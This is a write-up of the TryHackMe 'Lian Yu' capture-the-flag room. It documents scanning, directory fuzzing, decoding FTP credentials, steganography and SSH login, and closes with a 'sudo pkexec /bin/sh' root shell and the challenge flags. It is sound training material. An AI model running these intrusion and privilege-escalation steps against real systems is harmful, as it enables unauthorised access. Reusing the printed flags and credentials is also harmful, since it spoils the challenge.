#  Lian Yu

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / FTP / Steganography / Linux PrivEsc  
> **Date Completed:** 2026-04-19
  
> **Room Link:** [https://tryhackme.com/room/lianyu](https://tryhackme.com/room/lianyu)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Privilege Escalation](#privilege-escalation)
6. [Flags](#flags)
7. [Key Takeaways](#key-takeaways)

---

##  Room Overview

An Arrow-themed CTF set on the island of Lian Yu. The challenge chains together web directory fuzzing, hidden text discovery, FTP access, PNG header corruption, steganography, and a `pkexec` sudo privesc — all wrapped in Arrowverse lore. No prior knowledge of the show is needed.

**Goal:**  
Capture the user flag and root flag.

**Skills Practiced:**  
Gobuster directory fuzzing, hidden web content, Base58 decoding, FTP enumeration, PNG hex repair, steganography with `steghide`, SSH login, Linux sudo privesc via `pkexec`.

---

##  Reconnaissance

### Network Scanning

```
nmap -sC -sV 10.48.155.205
```

**Findings:**

| Port | Service | Version |
|------|---------|---------|
| 21   | FTP     | vsFTPd 3.0.2 |
| 22   | SSH     | OpenSSH |
| 80   | HTTP    | Apache |

---

##  Enumeration

### Web Application

Visiting `http://10.48.155.205/` loads an Arrowverse-themed page about Oliver Queen. `robots.txt` returns nothing, and the page source yields no useful clues.

### Gobuster — Round 1

```
gobuster dir -u http://10.48.155.205/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50
```

**Findings:**

| Path | Status |
|------|--------|
| `/island` | 301 → redirect |
| `/server-status` | 403 |

### `/island` — Hidden Codeword

Visiting `http://10.48.155.205/island/` shows a message hinting at a meeting point and a code word. The code word **`vigilante`** is present on the page but rendered in **white text** — invisible against the white background. Selecting all or viewing source reveals it.

### Gobuster — Round 2 (inside `/island`)

```
gobuster dir -u http://10.48.155.205/island/ \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -t 100
```

**Findings:** `/island/2100/`

### `/island/2100/` — Ticket Hint

Visiting `http://10.48.155.205/island/2100/` shows a page about how Oliver Queen reached Lian Yu, with an embedded (unavailable) YouTube video. The page source contains:

```
<!-- you can avail your .ticket here but how? -->
```

This hints at fuzzing for `.ticket` extension files.

### Gobuster — Round 3 (`.ticket` extension)

```
gobuster dir -u http://10.48.155.205/island/2100/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x .ticket
```

**Found:** `green_arrow.ticket`

### The Ticket

Visiting `http://10.48.155.205/island/2100/green_arrow.ticket`:

```
This is just a token to get into Queen's Gambit(Ship)

RTy8yhBQdscX
```

`RTy8yhBQdscX` is a **Base58**-encoded string. Decoding it:

```
RTy8yhBQdscX → !#th3h00d
```

---

##  Exploitation

### FTP Login

Using the codeword from `/island/` as the username and the decoded ticket as the password:

```
ftp 10.48.155.205
```

```
Username: vigilante
Password: !#th3h00d
```

```
ftp> ls
```

```
Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
```

Download all three files:

```
ftp> mget Leave_me_alone.png Queen's_Gambit.png aa.jpg
```

### Fixing the Corrupted PNG

`aa.jpg` and `Queen's_Gambit.png` open normally, but `Leave_me_alone.png` fails to render. Inspecting its hex header:

```
xxd Leave_me_alone.png | head
```

```
00000000: 5845 6fae 0a0d 1a0a ...   ← Corrupted PNG magic bytes
```

A valid PNG header must begin with:

```
89 50 4E 47 0D 0A 1A 0A
```

Fix the header using a hex editor, replacing the first 8 bytes with the correct PNG magic. The repaired image reveals a message with a **password in red text**.

### Steganography — Extracting Hidden Data

Using the password from the repaired image with `steghide` on `aa.jpg`:

```
steghide extract -sf aa.jpg
```

```
Enter passphrase: <password from image>
wrote extracted data to "ss.zip"
```

Unzip the archive:

```
unzip ss.zip
```

Files extracted: `passwd.txt` and `shado`

```
cat passwd.txt
# → Flavour text about the island — no direct credential here

cat shado
# → M3tahuman
```

### FTP — Hidden Files

Re-connecting to FTP and listing with `-la` to reveal hidden files:

```
ftp> ls -la
```

```
.other_user    ← Hidden file with background on Slade Wilson
```

```
ftp> get .other_user
```

Reading `.other_user` reveals the full backstory of **Slade Wilson** — hinting at the SSH username `slade`.

### SSH Login as Slade

```
ssh slade@10.48.155.205
```

```
Username: slade
Password: M3tahuman
```

Login successful — greeted with the Lian Yu ASCII banner.

---

## ⬆️ Privilege Escalation

### User Flag

```
ls
cat user.txt
```

**User flag found in `/home/slade/`.**

### Sudo Enumeration

```
sudo -l
```

```
User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```

`pkexec` can be used to execute commands as root.

### Escalation via `pkexec`

```
sudo pkexec /bin/sh
```

```
# whoami
root
```

Root shell obtained. 

### Root Flag

```bash
cat /root/root.txt
```

---

##  Flags

| Flag | Value |
|------|-------|
| User Flag | `THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}` |
| Root Flag | `THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}` |

---

##  Key Takeaways

- **Hidden text (white-on-white) is a real technique.** Always view source or select-all on pages that seem empty — colour-hidden content won't show in the render but is plaintext in the HTML.
- **File extension fuzzing matters.** The `.ticket` hint in the source comment was only exploitable because Gobuster was re-run with the `-x .ticket` flag — a reminder to fuzz for non-standard extensions when given hints.
- **Base58 is common in CTFs.** Recognise it by its alphanumeric character set (no 0, O, I, l) and typical 11–12 character length for short encoded values.
- **Always run `ls -la` in FTP.** Hidden files (dotfiles) won't appear with a plain `ls` — `.other_user` contained the pivotal username hint.
- **Corrupted file headers are a CTF staple.** Know the magic bytes for common formats: PNG (`89 50 4E 47 0D 0A 1A 0A`), JPEG (`FF D8 FF`), ZIP (`50 4B 03 04`).
- **`pkexec` as sudo = root.** Any binary that can execute arbitrary commands via sudo is a privesc vector. GTFOBins covers `pkexec` as well as many other common binaries.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port & service scanning |
| Gobuster | Multi-stage directory & extension fuzzing |
| Browser / View Source | Discovering hidden codeword and `.ticket` hint |
| Base58 Decoder | Decoding `RTy8yhBQdscX` → `!#th3h00d` |
| FTP client | File retrieval including hidden dotfiles |
| `xxd` + Hex Editor | Diagnosing and repairing corrupted PNG header |
| `steghide` | Extracting hidden zip from `aa.jpg` |
| SSH | Remote login as `slade` |
| `pkexec` | Sudo-based privilege escalation to root |

---

##  References

- [GTFOBins — pkexec](https://gtfobins.github.io/gtfobins/pkexec/)
- [HackTricks — Steganography](https://book.hacktricks.xyz/crypto-and-stego/stego-tricks)
- [PNG Magic Bytes Reference](https://en.wikipedia.org/wiki/PNG#File_header)
- [Base58 Decoder](https://appdevtools.com/base58-encoder-decoder)

---

*Writeup by Avaneesh*
